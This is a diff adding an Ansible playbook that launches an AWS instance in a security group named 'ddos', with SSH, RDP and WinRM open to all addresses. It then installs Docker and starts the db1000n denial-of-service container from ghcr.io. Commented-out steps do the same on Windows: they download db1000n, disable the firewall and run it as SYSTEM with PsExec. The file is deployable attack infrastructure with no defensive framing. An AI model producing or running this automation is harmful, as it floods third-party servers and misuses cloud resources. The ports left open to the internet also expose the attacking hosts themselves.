@@ -1,0 +1,115 @@
+- name: Prepare AWS account and create instances
+  hosts: localhost
+  gather_facts: false
+  module_defaults:
+    amazon.aws.ec2_key:
+      region: us-east-1
+    amazon.aws.ec2_group:
+      region: us-east-1
+    amazon.aws.ec2_instance:
+      region: us-east-1
+      key_name: "AWS"
+
+  tasks:
+    - name: "Add SSH key"
+      amazon.aws.ec2_key:
+        name: AWS
+        key_material: "{{ lookup('file', 'AWS.pub') }}"
+
+    - name: "Create SG with allowed management traffic"
+      amazon.aws.ec2_group:
+        name: ddos
+        description: Allows management traffic
+        rules:
+          - rule_desc: SSH
+            cidr_ip: 0.0.0.0/0
+            proto: tcp
+            from_port: 22
+            to_port: 22
+          - rule_desc: RDP
+            cidr_ip: 0.0.0.0/0
+            proto: tcp
+            from_port: 3389
+            to_port: 3389
+          - rule_desc: WinRM
+            cidr_ip: 0.0.0.0/0
+            proto: tcp
+            from_port: 5986
+            to_port: 5986
+
+    - name: "Create Linux instance"
+      amazon.aws.ec2_instance:
+        name: Linux
+        state: running
+        instance_type: t2.micro
+        security_group: ddos
+        image_id: ami-0c02fb55956c7d316
+        network:
+          assign_public_ip: true
+      register: result
+
+    - name: Add all Linux instance public IPs to host group
+      add_host: 
+        host: "{{ (result.instances | first).public_ip_address }}"
+        group: linux_ips
+
+    - name: Wait SSH to start
+      wait_for:
+        host: "{{ (result.instances | first).public_ip_address }}"
+        port: 22
+        delay: 10
+
+- name: Configure Linux instance
+  hosts: linux_ips
+  remote_user: ec2-user
+  become: true
+  vars:
+    ansible_ssh_private_key_file: ~/.ssh/AWS.pem
+  tasks:
+    - name: Install packages
+      yum:
+        name: docker
+        state: present
+
+    - name: Start docker
+      service:
+        name: docker
+        state: started
+    
+    - name: Start db1000n container
+      shell: docker run --name db1000n --rm -d --pull always ghcr.io/arriven/db1000n
+      
+
+  
+    # -name: "Create Windows instance"
+    #   amazon.aws.ec2_instance:
+    #     name: "Windows"
+    #     instance_type: t2.micro
+    #     security_group: ddos
+    #     image_id: ami-0f9a92942448ac56f
+    #     network:
+    #       assign_public_ip: true
+
+    # - name: Disable Domain firewall
+    # win_firewall:
+    #   state: disabled
+    #   profiles:
+      # - Domain
+    # tags: disable_firewall
+
+    # - name: Download file
+    #   src: https://github.com/Arriven/db1000n/releases/download/v0.8.10/db1000n_0.8.10_windows_amd64.zip
+    #   dest: /tmp/db1000n
+    #   remote_src: True
+    #   mode: 1777
+
+    # - name: Copy PsExec
+    #   win_copy:
+    #   src: &lt;tmp&gt;/PsExec.exe
+    #   dest: "{{ ansible_user_dir }}/Desktop/PsExec.exe"
+    #   force: no
+
+    # - name: run file
+    #   win_command: "{{ ansible_user_dir }}/Desktop/psexec.exe -accepteula -nobanner -i 1 -s db1000n.exe"
+    #   register: db1000n_out
+      
